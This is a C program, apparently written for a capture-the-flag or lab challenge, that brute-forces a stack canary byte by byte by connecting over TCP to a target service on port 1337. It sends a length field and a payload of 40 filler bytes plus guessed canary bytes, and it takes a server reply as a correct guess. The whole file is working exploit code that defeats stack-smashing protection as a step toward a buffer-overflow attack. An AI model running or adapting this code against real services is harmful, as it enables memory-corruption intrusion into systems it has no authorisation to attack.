#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>

#define HOST "set_02-miningx_chen5219-1"
#define PORT 1337

int main() {
    unsigned char canary[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct hostent *he = gethostbyname(HOST);
    
    printf("Starting Robust Brute Force against %s\n", HOST);

    for (int i = 1; i < 8; i++) {
        for (int b = 0; b <= 255; b++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            struct sockaddr_in addr = {AF_INET, htons(PORT)};
            memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                b--; usleep(200000); continue;
            }

            // 1. Send Length
            int current_len = 40 + i + 1;
            send(sock, &current_len, 4, 0);

            // 2. Prepare Payload
            unsigned char payload[64];
            memset(payload, 'A', 40);
            memcpy(payload + 40, canary, i);
            payload[40 + i] = (unsigned char)b;
            
            // 3. Send Payload
            usleep(20000); 
            send(sock, payload, current_len, 0);

            char buffer[1024] = {0};
            usleep(250000); // Wait for remote server to process
            
            int n = recv(sock, buffer, sizeof(buffer) - 1, 0);
            close(sock);

            if (n > 0) {
                canary[i] = (unsigned char)b;
                printf("\nFound Byte %d: 0x%02x | Progress: ", i, b);
                for(int k=0; k<=i; k++) printf("%02x", canary[k]);
                printf("\n");
                break;
            }

            // UI Refresh
            if (b % 8 == 0) {
                printf("\r[>] Byte %d: testing 0x%02x... ", i, b);
                fflush(stdout);
            }

        }
    }

    printf("\nFINAL CANARY: ");
    for(int i=0; i<8; i++) printf("%02x", canary[i]);
    printf("\n");

    return 0;
}
